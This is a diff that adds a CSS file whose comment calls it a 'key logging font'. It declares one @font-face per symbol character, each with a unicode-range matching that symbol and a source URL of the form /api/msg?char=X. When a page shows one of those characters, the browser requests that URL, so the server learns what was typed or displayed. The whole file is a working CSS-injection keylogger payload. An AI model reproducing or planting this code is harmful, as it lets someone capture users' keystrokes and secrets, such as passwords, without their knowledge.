@@ -1,0 +1,36 @@
+/*
+Symbol characters for key logging font.
+ */
+
+@font-face { font-family: x; src: url('/api/msg?char=`'), local(Comic Sans); unicode-range: U+60; }
+@font-face { font-family: x; src: url('/api/msg?char=~'), local(Comic Sans); unicode-range: U+7E; }
+@font-face { font-family: x; src: url('/api/msg?char=!'), local(Comic Sans); unicode-range: U+21; }
+@font-face { font-family: x; src: url('/api/msg?char=@'), local(Comic Sans); unicode-range: U+40; }
+@font-face { font-family: x; src: url('/api/msg?char=%23'), local(Comic Sans); unicode-range: U+23; }
+@font-face { font-family: x; src: url('/api/msg?char=$'), local(Comic Sans); unicode-range: U+24; }
+@font-face { font-family: x; src: url('/api/msg?char=%'), local(Comic Sans); unicode-range: U+25; }
+@font-face { font-family: x; src: url('/api/msg?char=^'), local(Comic Sans); unicode-range: U+5E; }
+@font-face { font-family: x; src: url('/api/msg?char=%26'), local(Comic Sans); unicode-range: U+26; }
+@font-face { font-family: x; src: url('/api/msg?char=*'), local(Comic Sans); unicode-range: U+2A; }
+@font-face { font-family: x; src: url('/api/msg?char=\('), local(Comic Sans); unicode-range: U+28; }
+@font-face { font-family: x; src: url('/api/msg?char=\)'), local(Comic Sans); unicode-range: U+29; }
+@font-face { font-family: x; src: url('/api/msg?char=-'), local(Comic Sans); unicode-range: U+2D; }
+@font-face { font-family: x; src: url('/api/msg?char=_'), local(Comic Sans); unicode-range: U+5F; }
+@font-face { font-family: x; src: url('/api/msg?char=='), local(Comic Sans); unicode-range: U+3D; }
+@font-face { font-family: x; src: url('/api/msg?char=%2B'), local(Comic Sans); unicode-range: U+2B; }
+@font-face { font-family: x; src: url('/api/msg?char=['), local(Comic Sans); unicode-range: U+5B; }
+@font-face { font-family: x; src: url('/api/msg?char=]'), local(Comic Sans); unicode-range: U+5D; }
+@font-face { font-family: x; src: url('/api/msg?char={'), local(Comic Sans); unicode-range: U+7B; }
+@font-face { font-family: x; src: url('/api/msg?char=}'), local(Comic Sans); unicode-range: U+7D; }
+@font-face { font-family: x; src: url('/api/msg?char=\\'), local(Comic Sans); unicode-range: U+5C; }
+@font-face { font-family: x; src: url('/api/msg?char=|'), local(Comic Sans); unicode-range: U+7C; }
+@font-face { font-family: x; src: url('/api/msg?char=;'), local(Comic Sans); unicode-range: U+3B; }
+@font-face { font-family: x; src: url('/api/msg?char=:'), local(Comic Sans); unicode-range: U+3A; }
+@font-face { font-family: x; src: url('/api/msg?char=\''), local(Comic Sans); unicode-range: U+27; }
+@font-face { font-family: x; src: url('/api/msg?char=\"'), local(Comic Sans); unicode-range: U+22; }
+@font-face { font-family: x; src: url('/api/msg?char=,'), local(Comic Sans); unicode-range: U+2C; }
+@font-face { font-family: x; src: url('/api/msg?char=<'), local(Comic Sans); unicode-range: U+3C; }
+@font-face { font-family: x; src: url('/api/msg?char=.'), local(Comic Sans); unicode-range: U+2E; }
+@font-face { font-family: x; src: url('/api/msg?char=>'), local(Comic Sans); unicode-range: U+3E; }
+@font-face { font-family: x; src: url('/api/msg?char=\/'), local(Comic Sans); unicode-range: U+2F; }
+@font-face { font-family: x; src: url('/api/msg?char=\?'), local(Comic Sans); unicode-range: U+3F; }
